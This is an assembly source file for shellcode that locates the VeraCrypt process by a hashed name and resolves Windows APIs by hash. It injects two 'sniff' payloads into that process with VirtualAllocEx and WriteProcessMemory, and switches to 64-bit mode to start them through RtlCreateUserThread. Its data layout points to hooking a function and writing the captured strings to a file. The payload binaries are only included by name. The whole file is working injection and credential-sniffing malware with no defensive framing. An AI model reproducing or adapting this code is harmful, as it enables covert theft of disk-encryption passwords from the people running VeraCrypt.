[bits 32]
    push esi
    call reloc_base
reloc_base:
    pop esi
    sub esi, 6

jmp main

[bits 64]
; arg0: str             rcx
;
; ret: num chars        rax
strlen_hg:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx                 ; str

        ; rbp - 8 = output strlen
        ; rbp - 16 = rsi
        sub rsp, 16                         ; allocate local variable space
    
        mov qword [rbp - 8], 0              ; strlen = 0
        mov [rbp - 16], rsi                 ; save rsi

        mov rsi, [rbp + 16]                 ; str

        jmp .while_condition
        .loop:
            inc qword [rbp - 8]             ; ++strlen

            .while_condition:
                lodsb                       ; load from mem to al

                cmp al, 0                   ; end of string ?
                jne .loop
    
        mov rsi, [rbp - 16]                 ; restore rsi 
        mov rax, [rbp - 8]                  ; strlen in rax

        leave
        ret

; arg0: str             rcx
; arg1: wstr            rdx
;
; ret: 1 if equal       rax
strcmpiAW_hg:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr

.loop:
    movzx eax, byte [rsi]
    movzx edx, byte [rdi]

    cmp al, dl

    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    cmp al, 0                       ; end of string ?
    je .loop_end_equal

    inc rsi
    add rdi, 2

    jmp .loop

    .al_more_than_dl:
        add dl, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov qword [rbp - 8], 0          ; return value
    jmp .shutdown

.loop_end_equal:
    mov qword [rbp - 8], 1          ; return value
    jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret

; arg0: str                     rcx
; arg1: wstr                    rdx
;
; ret: 1 if equal               rax
strcmpiAA_hg:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr

.loop:
    movzx eax, byte [rsi]
    movzx edx, byte [rdi]

    cmp al, dl
    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    cmp al, 0                       ; end of string ?
    je .loop_end_equal

    inc rsi
    inc rdi

    jnz .loop

    .al_more_than_dl:
        add dl, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov qword [rbp - 8], 0          ; return value
    jmp .shutdown

.loop_end_equal:
    mov qword [rbp - 8], 1          ; return value
    jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret

; arg0: base addr           rcx
; arg1: proc name           rdx
;
; return: proc addr         rax
get_proc_address_by_name_hg:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; base addr
    mov [rbp + 24], rdx                     ; proc name

    ; rbp - 8 = return value
    ; rbp - 16 = nt headers
    ; rbp - 24 = export data directory
    ; rbp - 32 = export directory
    ; rbp - 40 = address of functions
    ; rbp - 48 = address of names
    ; rbp - 56 = address of name ordinals
    ; rbp - 312 = forwarded dll.function name - 256 bytes
    ; rbp - 320 = function name
    ; rbp - 328 = loaded forwarded library addr
    ; rbp - 336 = function name strlen
    ; rbp - 344 = rbx
    ; rbp - 472 = dll name with extension -> not used, dll name used as is without .dll ext
    ; ebp - 480 = 8 bytes padding
    sub rsp, 480                            ; allocate local variable space
    sub rsp, 32                             ; allocate shadow space

    mov qword [rbp - 8], 0                  ; return value
    mov [rbp - 344], rbx                    ; save rbx

    mov rbx, [rbp + 16]                     ; base addr
    add rbx, 0x3c                           ; *e_lfa_new

    movzx ecx, word [rbx]                   ; e_lfanew

    mov rax, [rbp + 16]                     ; base addr
    add rax, rcx                            ; nt header

    mov [rbp - 16], rax                     ; nt header

    add rax, 24                             ; optional header
    add rax, 112                            ; export data directory

    mov [rbp - 24], rax                     ; export data directory

    mov rax, [rbp + 16]                     ; base addr
    mov rcx, [rbp - 24]                     ; export data directory
    mov ebx, [rcx]
    add rax, rbx                            ; export directory

    mov [rbp - 32], rax                     ; export directory

    add rax, 28                             ; address of functions rva
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of function rva

    mov [rbp - 40], rax                     ; address of functions

    mov rax, [rbp - 32]                     ; export directory
    add rax, 32                             ; address of names rva
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of names rva

    mov [rbp - 48], rax                     ; address of names

    mov rax, [rbp - 32]                     ; export directory
    add rax, 36                             ; address of name ordinals
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of name ordinals

    mov [rbp - 56], rax                     ; address of name ordinals

    mov r10, [rbp - 32]                     ; export directory
    add r10, 24                             ; number of names
    mov r10d, [r10]                         ; number of names in r10

    xor r11, r11
.loop_func_names:
    ; to index into an array, we multiply the size of each element with the 
    ; current index and add it to the base addr of the array
    mov dword eax, 4                        ; size of dword
    mul r11                                 ; size * index
    mov rbx, [rbp - 48]                     ; address of names
    add rbx, rax                            ; address of names + n
    mov ebx, [rbx]                          ; address of names [n]

    add rbx, [rbp +  16]                    ; base addr + address of names [n]

    mov rcx, [rbp + 24]                     ; proc name
    mov rdx, rbx
    call strcmpiAA_hg

    cmp rax, 1                              ; are strings equal
    je .function_found

    inc r11
    cmp r11, r10
    jne .loop_func_names

    jmp .shutdown

.function_found:
    mov rax, 2                              ; size of ordinal value
    mul r11                                 ; index * size of element of addrees of name ordinals(word)
    add rax, [rbp - 56]                     ; address of name ordinals + n
    movzx eax, word [rax]                   ; address of name ordinals [n]; index into address of functions

    mov rbx, 4                              ; size of element of address of functions(dword)
    mul rbx                                 ; index * size of element
    add rax, [rbp - 40]                     ; address of functions + index
    mov eax, dword [rax]                    ; address of functions [index]

    add rax, [rbp + 16]                     ; base addr + address of functions [index]

    mov [rbp - 8], rax                      ; return value

.shutdown:
    mov rbx, [rbp - 344]                    ; restore rbx
    mov rax, [rbp - 8]                      ; return value

    leave
    ret

; ret: ntdll handle     rax
get_ntdll_module_handle_hg:
        push rbp
        mov rbp, rsp
    
        ; rbp - 8 = First List Entry
        ; rbp - 16 = Current List Entry
        ; rbp - 24 = Table Entry
        ; rbp - 32 = return addr
        ; rbp - 56 = ntdll string
        ; rbp - 64 = padding bytes
        sub rsp, 64                         ; allocate local variable space
        sub rsp, 32                         ; allocate shadow space
    
        mov rax, 'ntdll.dl'
        mov [rbp - 56], rax
        mov rax, 'l'
        mov [rbp - 48], rax
    
        mov rax, gs:[0x60]                  ; peb
        add rax, 0x18                       ; *ldr
        mov rax, [rax]                      ; ldr
        add rax, 0x20                       ; InMemoryOrderModuleList
    
        mov [rbp - 8], rax                  ; *FirstModule
        mov rax, [rax]
        mov [rbp - 16], rax                 ; CurrentModule
        mov qword [rbp - 32], 0             ; return code
    
    .loop:
        cmp rax, [rbp - 8]                  ; CurrentModule == FirstModule ?
        je .loop_end_equal
            sub rax, 16                     ; *TableEntry
            mov [rbp - 24], rax             ; *TableEntry
    
            add rax, 0x58                   ; *BaseDLLName
            add rax, 0x8                    ; BaseDLLName.Buffer
    
            mov rcx, rbp
            sub rcx, 56                     ; ntdll string
            mov rdx, [rax]
            call strcmpiAW_hg
    
            cmp rax, 1                      ; strings match
            je .module_found
    
            mov rax, [rbp - 16]             ; CurrentModule
            mov rax, [rax]                  ; CurrentModule = CurrentModule->Flink
            mov [rbp - 16], rax             ; CurrentModule
    
            jmp .loop
    
    .module_found:
        mov rax, [rbp - 24]                 ; *TableEntry
        add rax, 0x30                       ; TableEntry->DllBase
        mov rax, [rax]
        mov [rbp - 32], rax
    
        jmp .shutdown
    
    .loop_end_equal:
    
    .shutdown:
        mov rax, [rbp - 32]                 ; return code
    
        leave
        ret

[bits 32]
go_to_64_bit:
    retf

[bits 64]
go_to_32_bit:
    retfq

[bits 32]
; arg0: str                 [ebp + 8]
;
; ret: num chars            eax
utils_strlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = rsi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; str

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsb

            cmp al, 0           ; end of string ?
            jne .loop

.shutdown:
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; output

    leave
    ret 4

; arg0: wstr        [ebp + 8]
;
; ret: num chars    eax
utils_wstrlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = esi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output strlen
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; wstr

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsw

            cmp ax, 0           ; end of string ?
            jne .loop       

.shutdown:
    mov esi, [ebp - 8]          ; save esi
    mov eax, [ebp - 4]          ; strlen

    leave
    ret 4

; arg0: &str        [ebp + 8]
;
; ret: folded hash  eax
utils_str_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value (hash)
        ; ebp - 8 = ebx
        ; ebp - 12 = esi
        ; ebp - 16 = edi

        ; esi = i
        ; edi = strlen
        ; edx = tmp word value from str
        ; ebx = &str
        ; ecx = offset from ebx
        ; eax = currentFold
        sub esp, 16                 ; local variable space

        mov [ebp - 8], ebx          ; store ebx
        mov [ebp - 12], esi         ; store esi
        mov [ebp - 16], edi         ; store edi

        mov dword [ebp - 4], 0      ; hash
        mov ebx, [ebp + 8]          ; &str

        xor esi, esi                ; i = 0

        push dword [ebp + 8]        ; &str
        call utils_strlen

        mov edi, eax                ; strlen

    .loop:
        xor eax, eax                ; currentFold
        mov al, [ebx + esi]         ; str[i] in ax, currentFold
        shl eax, 8                  ; <<= 8

    .i_plus_1:
        mov ecx, esi                ; i
        inc ecx
        
        cmp ecx, edi                ; i + 1 < strlen
        jge .cmp_end

        movzx edx, byte [ebx + ecx]
        xor eax, edx                ; currentFold |= str[i + 1]

    .cmp_end:
        add [ebp - 4], eax          ; hash += currentFold
        add esi, 2                  ; i += 4

        cmp esi, edi                ; i < strlen
        jl .loop

    .shutdown:
        mov eax, [ebp - 4]          ; return value

        mov edi, [ebp - 16]         ; restore edi
        mov esi, [ebp - 12]         ; restore esi
        mov ebx, [ebp - 8]          ; restore ebx

        leave
        ret 4

; arg0: &wstr        [ebp + 8]
;
; ret: folded hash  eax
utils_wstr_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value (hash)
        ; ebp - 8 = ebx
        ; ebp - 12 = esi
        ; ebp - 16 = edi

        ; esi = i
        ; edi = wstrlen
        ; edx = tmp word value from wstr
        ; ebx = &wstr
        ; ecx = offset from ebx
        ; eax = currentFold
        sub esp, 16                 ; local variable space

        mov [ebp - 8], ebx          ; store ebx
        mov [ebp - 12], esi         ; store esi
        mov [ebp - 16], edi         ; store edi

        mov dword [ebp - 4], 0      ; hash
        mov ebx, [ebp + 8]          ; &wstr

        xor esi, esi                ; i = 0

        push dword [ebp + 8]        ; &wstr
        call utils_wstrlen

        mov edx, 2
        mul edx                     ; double the bytes for wstr

        mov edi, eax                ; wstrlen

    .loop:
        xor eax, eax                ; currentFold
        mov al, [ebx + esi]         ; wstr[i] in ax, currentFold
        shl eax, 8                  ; <<= 8

    .i_plus_1:
        mov ecx, esi                ; i
        add ecx, 2                  ; i + 1 (2 bytes)
        
        cmp ecx, edi                ; i + 1 < wstrlen
        jge .cmp_end

        movzx edx, byte [ebx + ecx]
        xor eax, edx                ; currentFold |= wstr[i + 1]

    .cmp_end:
        add [ebp - 4], eax          ; hash += currentFold
        add esi, 4                  ; i += 4

        cmp esi, edi                ; i < wstrlen
        jl .loop

    .shutdown:
        mov eax, [ebp - 4]          ; return value

        mov edi, [ebp - 16]         ; restore edi
        mov esi, [ebp - 12]         ; restore esi
        mov ebx, [ebp - 8]          ; restore ebx

        leave
        ret 4

; arg0: target hash     ebp + 8
; 
; ret: proc id          eax
utils_find_target_pid_by_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = snapshot handle
        ; ebp - 304 = process entry struct
        sub esp, 304                ; local variable space

        mov dword [ebp - 4], -1     ; return value

        push 0
        push 0x2                    ; TH32CS_SNAPPROCESS
        call [esi + data + 4]       ; createToolhelp32Snapshot

        cmp eax, -1
        je .shutdown

        mov [ebp - 8], eax          ; snapshot handle
        mov dword [ebp - 304], 296  ; processentry.dwSize

        mov eax, ebp
        sub eax, 304                ; &processentry
        push eax
        push dword [ebp - 8]        ; snapshot handle
        call [esi + data + 8]       ; process32First

        cmp eax, 0
        je .shutdown

    .loop:
        mov eax, ebp
        sub eax, 304                ; &processEntry
        push eax
        push dword [ebp - 8]        ; snapshot handle
        call [esi + data + 12]      ; process32Next

        cmp eax, 0
        je .loop_end

        mov eax, ebp
        sub eax, 304
        add eax, 36                 ; processEntry.szExeFile
        push eax
        call utils_str_hash

        cmp eax, [ebp + 8]          ; cur hash == target hash
        je .process_found

        jmp .loop

    .process_found:
        mov eax, ebp
        sub eax, 304                ; &processEntry
        add eax, 8                  ; processEntry.th32ProcessID

        mov eax, [eax]
        mov [ebp - 4], eax

        jmp .shutdown
    .loop_end:

    .shutdown:

        push dword [ebp - 8]        ; snapshot handle
        call [esi + data + 16]      ; CloseHandle
        
        mov eax, [ebp - 4]          ; return value

        leave
        ret 4

; arg0: base addr           [ebp + 8]
; arg1: proc name hash      [ebp + 12]
;
; ret:  proc addr           eax
get_proc_address_by_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = nt headers
        ; ebp - 12 = export data directory
        ; ebp - 16 = export directory
        ; ebp - 20 = address of functions
        ; ebp - 24 = address of names
        ; ebp - 28 = address of name ordinals
        ; ebp - 284 = forwarded dll.function name - 256 bytes
        ; ebp - 288 = function name
        ; ebp - 292 = loaded forwarded library addr
        ; ebp - 296 = function name strlen
        ; ebp - 300 = ebx
        ; ebp - 304 = temp var (r8)
        ; ebp - 308 = temp var (r9)
        ; ebp - 312 = temp var (r10)
        ; ebp - 316 = temp var (r11)
        sub esp, 316                                ; allocate local variable space

        mov dword [ebp - 4], 0                      ; return value
        mov [ebp - 300], ebx                        ; save ebx
   
        mov ebx, [ebp + 8]                          ; base addr
        add ebx, 0x3c                               ; *e_lfa_new

        movzx ecx, word [ebx]                       ; e_lfanew

        mov eax, [ebp + 8]                          ; base addr
        add eax, ecx                                ; nt header

        mov [ebp - 8], eax                          ; nt header

        add eax, 24                                 ; optional header
        add eax, 96                                 ; export data directory

        mov [ebp - 12], eax                         ; export data directory

        mov eax, [ebp + 8]                          ; base addr
        mov ecx, [ebp - 12]                         ; export data directory
        mov ebx, [ecx]
        add eax, ebx                                ; export directory

        mov [ebp - 16], eax                         ; export directory

        add eax, 28                                 ; address of functions rva
        mov eax, [eax]                              ; rva in eax
        add eax, [ebp + 8]                          ; base addr + address of function rva

        mov [ebp - 20], eax                         ; address of functions

        mov eax, [ebp - 16]                         ; export directory
        add eax, 32                                 ; address of names rva
        mov eax, [eax]                              ; rva in eax
        add eax, [ebp + 8]                          ; base addr + address of names rva

        mov [ebp - 24], eax                         ; address of names

        mov eax, [ebp - 16]                         ; export directory
        add eax, 36                                 ; address of name ordinals
        mov eax, [eax]                              ; rva in eax
        add eax, [ebp + 8]                          ; base addr + address of name ordinals

        mov [ebp - 28], eax                         ; address of name ordinals

        mov eax, [ebp - 16]
        mov [ebp - 312], eax                        ; export directory
        add dword [ebp - 312], 12                   ; number of names
        mov eax, ebp
        sub eax, 312
        mov eax, [eax]
        mov [ebp - 312], eax                        ; number of names in [ebp - 312]

        mov dword [ebp - 316], 0                    ; index

    .loop_func_names:
        ; to index into an array, we multiply the size of each element with the 
        ; current index and add it to the base addr of the array
        mov dword eax, 4                            ; size of dword
        mul dword [ebp - 316]                       ; size * index
        mov ebx, [ebp - 24]                         ; address of names
        add ebx, eax                                ; address of names + n
        mov ebx, [ebx]                              ; address of names [n]

        add ebx, [ebp +  8]                         ; base addr + address of names [n]

        push ebx                                    ; base addr + address of names [n]
        call utils_str_hash

        cmp eax, [ebp + 12]                          ; proc name hash
        je .function_found

        inc dword [ebp - 316]
        mov eax, [ebp - 312]
        cmp [ebp - 316], eax
        jne .loop_func_names

        jmp .shutdown

    .function_found:
        mov eax, 2                                  ; size of ordinal value
        mul dword [ebp - 316]                       ; index * size of element of addrees of name ordinals(word)
        add eax, [ebp - 28]                         ; address of name ordinals + n
        movzx eax, word [eax]                       ; address of name ordinals [n]; index into address of functions

        mov ebx, 4                                  ; size of element of address of functions(dword)
        mul ebx                                     ; index * size of element
        add eax, [ebp - 20]                         ; address of functions + index
        mov eax, dword [eax]                        ; address of functions [index]

        add eax, [ebp + 8]                          ; base addr + address of functions [index]

        mov [ebp - 4], eax                          ; return value

    .shutdown:
        mov ebx, [ebp - 300]                        ; restore ebx
        mov eax, [ebp - 4]                          ; return value

        leave
        ret 4

; ret: kernel module hnd       eax
utils_get_kernel_module_handle:
        push ebp
        mov ebp, esp

        ; ebp - 4 = first list entry
        ; ebp - 8 = current list entry
        ; ebp - 12 = table entry
        ; ebp - 16 = kernel mod addr
        sub esp, 16                                 ; allocate local variable space

        mov eax, fs:[0x30]                          ; peb
        add eax, 0xc                                ; *ldr
        mov eax, [eax]                              ; ldr
        add eax, 0x14                               ; InMemoryOrderModuleList

        mov [ebp - 4], eax                          ; *FirstModule
        mov eax, [eax]                              ; FirstModule
        mov [ebp - 8], eax                          ; CurrentModule

    .loop:
        cmp eax, [ebp - 4]                          ; CurrentModule == FirstModule ?
        je .loop_end_equal
            sub eax, 8                              ; *TableEntry
            mov [ebp - 12], eax                     ; *TableEntry

            add eax, 0x2c                           ; *BaseDLLName
            add eax, 0x4                            ; BaseDLLName->Buffer

            push dword [eax]                        ; BaseDLLName.Buffer
            call utils_wstr_hash

            cmp eax, 0x190a1                        ; KERNEL32.DLL hash

            je .module_found

            mov eax, [ebp - 8]                      ; CurrentModule
            mov eax, [eax]                          ; CurrentModule = CurrentMdoule->Flink
            mov [ebp - 8], eax                      ; CurrentModule

            jmp .loop

    .module_found:
        mov eax, [ebp - 12]                         ; *TableEntry
        add eax, 0x18                               ; TableEntry->DllBase
        mov eax, [eax]                              ; DllBase 
        mov [ebp - 16], eax                         ; mod addr

        jmp .shutdown

    .loop_end_equal:

    .shutdown:
        mov eax, [ebp - 16]                         ; mod addr

        leave
        ret

populate_func_addrs:
        push ebp
        mov ebp, esp

        ; CreateToolhelp32Snapshot
        push 0x480d4                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 4], eax               ; CreateToolhelp32Snapshot

        ; Process32First
        push 0x2a7a7                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 8], eax              ; Process32First addr

        ; Process32Next
        push 0x2a441                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 12], eax              ; Process32Next addr

        ; CloseHandle
        push 0x24301                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 16], eax              ; CloseHandle addr

        ; OpenProcess
        push 0x24d26                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 20], eax              ; OpenProcess addr

        ; VirtualAllocEx
        push 0x2cbc6                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 24], eax              ; VirtualAllocEx addr

        ; WriteProcessMemory
        push 0x39cca                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 28], eax              ; WriteProcessMemory addr

        ; ResumeThread
        push 0x25b70                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 32], eax              ; ResumeThread addr

        ; VirtualFreeEx
        push 0x2fa2e                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 36], eax              ; VirtualFreeEx addr

        ; Sleep
        push 0x128d1                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 40], eax              ; Sleep addr

    .shutdown:
        leave
        ret

main:
        push ebp
        mov ebp, esp

        ; ebp - 8  = return value
        ; ebp - 16 = target pid
        ; ebp - 24 = target hnd
        ; ebp - 32 = sniff mem
        ; ebp - 40 = sniff hooked func mem
        ; ebp - 64 = RtlCreateUserThread str
        ; ebp - 72 = RtlCreateUserThread addr
        ; ebp - 80 = ntdll addr
        ; ebp - 88 = out ptr for thread id
        ; ebp - 96 = padding bytes
        sub esp, 96                         ; local variable space
        sub esp, 80                         ; shadow space

        call utils_get_kernel_module_handle

        cmp eax, 0
        je .shutdown

        mov [esi + data], eax               ; kernel32 hnd

        call populate_func_addrs
        
        ; find VeraCrypt
        mov ecx, 0x2c44e                    ; VeraCrypt.exe hash
        push ecx
        call utils_find_target_pid_by_hash

        cmp eax, 0
        je .shutdown

        mov [ebp - 16], eax                 ; target pid

        ; open hnd to target proc
        push dword [ebp - 16]               ; target pid
        push dword 0
        push dword 0x1fFFFF                 ; PROCESS_ALL_ACCESS
        call [esi + data + 20]              ; openProcess

        cmp eax, 0
        je .shutdown

        mov [ebp - 24], eax                 ; target hnd

        ; alloc mem for sniff and data
        push dword 0x40                     ; PAGE_EXECUTE_READWRITE
        push dword 0x3000                   ; MEM_RESERVE | MEM_COMMIT
        mov ecx, sniff_x64.len
        add ecx, [esi + data + 44]          ; sniff data size
        push ecx
        push dword 0
        push dword [ebp - 24]               ; target hnd
        call [esi + data + 24]              ; virtualAllocEx

        cmp eax, 0
        je .shutdown

        mov [ebp - 32], eax                 ; sniff mem
        ; alloc mem sniff hooked func and data
        push dword 0x40                     ; PAGE_EXECUTE_READWRITE
        push dword 0x3000                   ; MEM_RESERVE | MEM_COMMIT
        mov ecx, sniff_hooked_func_x64.len
        add ecx, 292                        ; sniff hooked func data size
        push ecx
        push dword 0
        push dword [ebp - 24]               ; target hnd
        call [esi + data + 24]              ; virtualAllocEx

        cmp eax, 0
        je .shutdown

        mov [ebp - 40], eax                 ; sniff hooked func mem
        mov [esi + data + 88], eax          ; hooked mem addr
        mov dword [esi + data + 92], 0      ; zero out the higher dword

        ; write sniff
        push dword 0
        push sniff_x64.len
        mov eax, esi
        add eax, sniff_x64
        push eax
        push dword [ebp - 32]               ; sniff mem
        push dword [ebp - 24]               ; target hnd
        call [esi + data + 28]              ; writeProcessMemory

        cmp eax, 0
        je .shutdown

        ; write sniff data
        push dword 0
        push dword [esi + data + 44]        ; sniff data size
        mov edx, esi
        add edx, data
        add edx, 48                         ; sniff data esi + data + 48
        push edx                            ; sniff data
        mov ecx, [ebp - 32]                 ; sniff mem
        add ecx, sniff_x64.len
        push ecx
        push dword [ebp - 24]               ; target hnd
        call [esi + data + 28]              ; writeProcessMemory

        cmp eax, 0
        je .shutdown

        ; write sniff hooked func
        push dword 0
        push dword sniff_hooked_func_x64.len
        mov ecx, esi
        add ecx, sniff_hooked_func_x64
        push ecx
        push dword [ebp - 40]               ; sniff hooked func mem
        push dword [ebp - 24]               ; target hnd
        call [esi + data + 28]              ; writeProcessMemory

        cmp eax, 0
        je .shutdown

        ; write sniff hooked func data
        push dword 0
        push dword 292                      ; sniff hooked func data size
        mov edx, esi
        add edx, data
        add edx, 96                         ; sniff hooked func data
        push edx
        mov eax, [ebp - 40]                 ; sniff hooked func mem
        add eax, sniff_hooked_func_x64.len
        push eax
        push dword [ebp - 24]               ; target hnd
        call [esi + data + 28]              ; writeProcessMemory

        cmp eax, 0
        je .shutdown

        ; jump to 64 bit
        push dword 0x33
        call go_to_64_bit

    [bits 64]
        ; get ntdll hnd
        call get_ntdll_module_handle_hg

        cmp rax, 0
        je .shutdown_64_bit

        mov [rbp - 80], rax                 ; ntdll addr

        ; Create func str
        mov rax, 'RtlCreat'
        mov [rbp - 64], rax

        mov rcx, 'eUserThr'
        mov [rbp - 56], rcx

        mov rdx, 'ead'
        mov [rbp - 48], rdx
        mov byte [rbp - 45], 0

        ; get func addr
        mov rcx, [rbp - 80]                 ; ntdll addr
        mov rdx, rbp
        sub rdx, 64                         ; RtlCreateUserThread str
        call get_proc_address_by_name_hg

        cmp rax, 0
        je .shutdown_64_bit

        mov [rbp - 72], rax                 ; RtCreateUserThread addr

        ; call func
        mov ecx, [rbp - 24]                 ; targt hnd
        xor edx, edx
        xor r8d, r8d
        xor r9d, r9d
        mov qword [rsp + 32], 0
        mov qword [rsp + 40], 0
        mov eax, [rbp - 32]                 ; sniff mem
        mov [rsp + 48], rax
        mov qword [rsp + 56], 0
        mov rax, rbp
        sub rax, 88                         ; out ptr to thread id
        mov [rsp + 64], rax
        mov qword [rsp + 72], 0
        call [rbp - 72]                     ; RtlCreateUserThread

    .shutdown_64_bit:
        ; jump to 32 bit
        push dword 0x23
        call go_to_32_bit

    [bits 32]
        push dword [ebp - 88]               ; remote thread id
        call [esi + data + 32]              ; resumeThread

    .shutdown:
        ; wait 1 sec for remote thread create to finish
        push 2000
        call [esi + data + 40]              ; sleep

        push dword 0x8000                   ; MEM_RELEASE
        push dword 0
        push dword [ebp - 32]               ; sniff mem
        push dword [ebp - 24]               ; target hnd
        call [esi + data + 36]              ; virtualFreeEx
        
        push dword [ebp - 16]               ; target pid
        call [esi + data + 16]              ; closeHandle

        leave
        pop esi
        ret

%include 'sniff.x64.bin.asm'
%include 'sniff_hooked_func.x64.bin.asm'

align 16
data:
; kernel32                  0
; createToolhelp32Snapshot  4
; process32First            8
; process32Next             12
; closeHandle               16
; openProcess               20
; virtualAllocEx            24
; writeProcessMemory        28
; resumeThread              32
; virtualFreeEx             36
; sleep                     40

; sniff* data size           44

; sniff data
; getModuleHandleA              48
; loadLibraryA                  56
; imageDirectoryEntryToDataEx   64
; virtualProtect                72
; funcAddrPage                  80
; hookedFuncMem                 88

; sniff hooked func data
; wideCharToMultiByte           96
; createFile                    104
; writeFile                     112
; closeHandle                   120
; filePath                      128